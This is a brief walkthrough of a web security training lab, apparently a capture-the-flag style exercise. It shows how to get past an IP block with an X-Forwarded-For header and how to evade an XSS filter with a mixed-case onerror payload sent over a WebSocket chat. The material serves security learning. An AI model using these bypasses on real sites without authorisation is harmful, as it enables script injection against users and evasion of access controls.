Title: Manipulating the WebSocket handshake to exploit vulnerabilities
Level: PRACTITIONER
Desc:  This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 
Hint: Sometimes you can bypass IP-based restrictions using HTTP headers like X-Forwarded-For. 

# Walkthrough: 
I've got blocked by sending malicious request via websocket:
<img width="1124" height="709" alt="image" src="https://github.com/user-attachments/assets/7ba39847-966c-4db5-98b7-56a5262dc2c0" />

Adding special header `X-Forwarded-For: 1.1.1.1`:
<img width="399" height="483" alt="image" src="https://github.com/user-attachments/assets/cc430144-0afc-44ab-91a2-c05981bf1b72" />

changing payload to : ```{"message":"<img src=1 oNeRroR='alert`1`'>"}```
